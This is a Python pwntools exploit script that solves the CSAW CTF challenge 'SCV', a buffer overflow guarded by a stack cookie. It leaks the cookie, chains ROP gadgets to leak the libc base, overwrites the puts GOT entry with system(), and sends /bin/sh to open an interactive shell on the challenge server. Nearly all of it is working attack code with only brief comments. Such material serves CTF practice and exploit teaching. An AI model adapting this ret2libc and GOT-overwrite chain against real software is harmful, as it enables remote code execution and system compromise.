#!/usr/bin/env python

"""Solution for SCV.

This is a buffer overflow problem with limited space for a ROP chain (64 bytes).
It is also protected by a stack cookie. First we need to leak the stack cookie,
and then we use a three stage exploit to leak libc base, overwrite a GOT entry
with system(), and finally trigger the shell.
"""

from pwn import *

#context.log_level = "debug"
context.binary = "./scv"
scv = context.binary
libc = ELF("./libc-2.23.so")

#conn = gdb.debug("./scv", "")
#conn = process("./scv")
conn = remote("pwn.chal.csaw.io", 3764)

SCV_MAIN = 0x400a96
SCV_POP_RDI_GADGET = 0x400ea3
LIBC_POP_RSI_GADGET = 0x202e8
LIBC_POP_RDX_GADGET = 0x1b92

def feed_scv(buf):
    conn.sendline("1")
    conn.recvuntil(">>")
    conn.send(buf)
    conn.recvuntil(">>")

def review_food(recv=True):
    conn.sendline("2")
    conn.recvuntil("TREAT HIM WELL")
    conn.recvline()
    conn.recvline()
    if recv:
        data = conn.recvuntil("\n----", drop=True)
        conn.recvuntil(">>")
        return data

def mine_minerals():
    conn.sendline("3")
    conn.recvline()


# Fill buffer with non-zero up until stack cookie
conn.recvuntil(">>")
feed_scv("a" * 0xa9)   # plus one (first char of the stack cookie is 0)

# Leak the stack cookie
log.info("Leaking stack cookie")
data = review_food()
cookie = "\x00" + data[0xa9:0xb0]
log.info("Stack cookie: " + cookie.encode("hex"))

# Build the stage0 payload
# Leak the addr of puts() from the GOT, then restart for stage 1
stage0 =  p64(SCV_POP_RDI_GADGET)
stage0 += p64(scv.got["puts"])
stage0 += p64(scv.plt["puts"])
stage0 += p64(SCV_MAIN) # Jump back to main

# Send the payload and trigger it
payload = "a"*0xa8 + cookie + "b"*8 + stage0
log.info("Sending stage 0 (0x{:x} bytes)".format(len(payload)))
feed_scv(payload)
mine_minerals()

# Calculate libc base and additional gadgets for read() from leaked puts() address
puts = conn.recvline(keepends=False)
puts += "\x00" * (8 - len(puts))
puts = u64(puts)
libc.address = puts - libc.symbols["puts"]
pop_rsi = libc.address + LIBC_POP_RSI_GADGET
pop_rdx = libc.address + LIBC_POP_RDX_GADGET
log.info("Found libc base: " + hex(libc.address))
log.info("Found libc system(): " + hex(libc.symbols["system"]))
log.info("Found libc \"pop rsi\" gadget: " + hex(pop_rsi))
log.info("Found libc \"pop rdx\" gadget: " + hex(pop_rdx))

# Build the stage1 payload
# Overwrite puts() with system(), then restart for stage 2
stage1 =  p64(SCV_POP_RDI_GADGET)
stage1 += p64(0)        # stdin
stage1 += p64(pop_rsi)
stage1 += p64(scv.got["puts"])
stage1 += p64(pop_rdx)
stage1 += p64(8)
stage1 += p64(scv.plt["read"])
stage1 += p64(SCV_MAIN) # Jump back to main

# Send the payload and trigger it. The stage1 payload will read 8 bytes into the
# GOT entry for puts. Send the address of system.
conn.recvuntil(">>")
payload = "a"*0xa8 + cookie + "b"*8 + stage1
log.info("Sending stage 1 (0x{:x} bytes)".format(len(payload)))
feed_scv(payload)
mine_minerals()

conn.send(p64(libc.symbols["system"]))
log.info("Overwrote puts() with system()")

# Send /bin/sh and try to puts() it (now system)
conn.recvuntil(">>")
log.info("Sending /bin/sh")
feed_scv("/bin/sh\x00")
review_food(False)

conn.interactive()
